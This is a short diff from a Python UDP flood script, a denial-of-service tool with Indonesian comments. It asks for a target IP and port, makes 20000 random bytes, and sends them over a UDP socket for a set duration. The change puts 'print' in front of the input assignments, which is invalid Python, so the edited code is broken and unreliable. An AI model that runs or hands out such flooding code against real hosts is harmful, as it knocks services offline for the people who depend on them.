@@ -18,8 +18,8 @@ def flood(victim, vport, duration):
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
-    IP = input("IP Target = ")
-    Port = input("Port = ")
+    print IP = input("IP Target = ")
+    print Port = input("Port = ")
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
